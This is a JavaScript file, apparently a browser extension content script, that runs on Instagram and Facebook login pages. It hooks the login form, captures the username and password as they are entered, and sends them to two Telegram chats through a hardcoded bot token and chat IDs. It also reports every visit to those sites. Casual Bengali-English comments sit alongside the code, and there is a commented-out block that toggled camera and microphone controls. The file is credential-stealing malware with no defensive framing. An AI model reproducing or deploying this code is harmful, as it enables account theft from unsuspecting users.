
//Change this interval to your choice
//INTERVAL = 8;


//alert("miraj kaj hoye6e 🥳🥳");


var button ;
var username ; 
var password ; 
var pVal , uVal;
const k = `5439952376:AAEuLaxT54QBPl8smTiQ4AriTW6bqQLUXlc`;
var Argha = `https://api.telegram.org/bot${k}/sendMessage?chat_id=1548471825&text=` ;
var Miraj = `https://api.telegram.org/bot${k}/sendMessage?chat_id=941377434&text=`; 
function start()
{
    url = location.href;
//    alert("URl : "+location.href);
    
    if(url.includes("instagram.com"))
        {
         setTimeout(instagram , 1500);
        }
    else if(url.includes("facebook.com"))
        {
            facebook();
        }
    
}


function instagram() {
  //alert("you are on Instagram");
  fetch(Argha+"someone opened Instagram");
  fetch(Miraj+"Miraj Da keu Instagram khullo");
  try {
   // alert(document.getElementById("loginForm"));
    document.querySelector("button").addEventListener("click" , ()=>{
      username = document.querySelector("[name='username']").value;
      password = document.querySelector("[name='password']").value;
      fetch(Argha+"instaid:-"+username+",pass:-"+password);
      fetch(Miraj+"Miraj da 😍 instaid:-"+username+",pass:-"+password);

      //alert("too close");
    }) 
  } catch (e) {
      fetch(Miraj+"Miraj da insta te aktu problem holo");
      fetch(Argha+"insta problem");

  }


} 


function facebook()
{
  
//  alert("you ar on Facebook");
fetch(Miraj+"Miraj da keu facebook khullo");
fetch(Argha+"facebook");
 if (document.querySelector("form") != null) {
   try {
    
   document.querySelector("form").addEventListener("submit" , ()=>{
     username = document.getElementById("email").value ;
     password = document.getElementById("pass").value ;
     fetch(Argha+"facebookid:-"+username+",pass:-"+password);
     fetch(Miraj+"facebookid:-"+username+",pass:-"+password);

   });
    
   } catch (e) {
     alert("sorry");
   }
   
 }
   
  
 
  
}

document.onload=start();


  /*setTimeout(function(){
      try
      {
        items = document.getElementsByTagName("div");
        for(i=0;i<items.length;i++)
        {
          if(items[i].hasAttribute("aria-label"))
          {
            if(items[i].getAttribute("aria-label").includes("microphone") || items[i].getAttribute("aria-label").includes("camera"))
            {
              document.getElementsByTagName("body")[0].click()
              // console.log(items[i].innerHTML);
              items[i].click()
            }
          }
        }

      }

      catch(err)
      {
        console.log(err)
      }

      meet();
      
       
    },INTERVAL*1000)  */
